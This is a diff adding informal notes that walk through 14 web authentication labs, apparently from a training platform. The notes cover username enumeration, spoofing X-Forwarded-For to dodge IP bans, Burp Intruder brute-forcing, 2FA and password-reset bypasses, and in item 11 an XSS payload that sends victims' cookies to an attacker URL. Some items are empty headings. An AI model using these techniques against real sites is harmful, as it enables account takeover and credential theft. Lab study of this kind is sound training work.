@@ -1,0 +1,81 @@
+1. Username enumeration via different responses
+
+	investigate the login page and submit an invalid username and password then go to the intruder
+	then clear to remove any automatically assigned payloads positions,only select username position
+	leave the pass as any static value for now , then start attack view the result we can notice that
+	length has been changed than any other value so this is correct username now we can input the 
+	correct username than we we will select pass field and brute force on that field we will see 
+	302 response if the csrf token does not valid use than refresh the login page
+
+2. Username enumeration via subtly different responses
+
+	Grep - Extract  in the dialog  scroll down through the response until you find the error message
+	Invalid username or password start attack
+
+3. Username enumeration via response timing
+
+	if you try to login from one ip 3 or 4 attempts, server will ban your ip for 30 min so you can 
+	check if the X-Forwarded-For: valids in back end server then you will change the value of the
+	header 
+	Back in your browser, reload the login page so that you have a valid CSRF token. Then, log in 		using the username and password that you noted down. 
+
+4. Broken brute-force protection, IP block
+	 Your credentials: wiener:peter
+	 Victim's username: carlos 
+	weiner peter
+	carlos 1234
+	weiner peter
+	carlos wwer
+	weiner peter
+	carlos montoya correct
+	burp intruder pitchfork method will be used
+
+5. Username enumeration via account lock
+
+	to bypass you need to add another parameter in intruder &count=§0§ then select username and 
+	count then set the count value to 5 and select the cluster bomp method to do brute force attack
+	observe response look over any changes that you can find
+
+6. Broken brute-force protection, multiple credentials per request
+
+
+"username" : "pots"
+"username" : "carlos",
+"password" : [
+    "123456",
+    "password",
+    "qwerty"
+    ...
+]
+
+7. 2FA simple bypass
+
+	enter in a valid account then go to the account and see the parameter in url 
+	"my-account?id=wiener" then go to the victim account authentication code will not be required
+	so we can change the name to victim then we can bypass 2FA 
+
+8. 2FA broken logic
+
+	now login as known username and pass then change the name from wienr to carlos and brute force
+	the 2FA and aware of csrf token if u logout your csrf token will be expired
+
+9. 2FA bypass using a brute-force attack
+
+10. Brute-forcing a stay-logged-in cookie
+
+11. Offline password cracking
+
+	create a js script <script> document.location='url/'+document.cookie</script> then send it to
+	victim then we will get victims username and pass in base64 encoding or in any other format
+	then you get hashed pass and go to the crackingstation.net and decrypt it 
+
+12.Password reset broken logic
+	at first click on forgot password
+	this time we will access our password reset page through mail server and now we will make null
+	to our csrf tokens and replace my name to victims and reset the password of victim so that we
+	bypass the victim account
+
+13. Password reset poisoning via middleware
+
+14. Password brute-force via password change
+
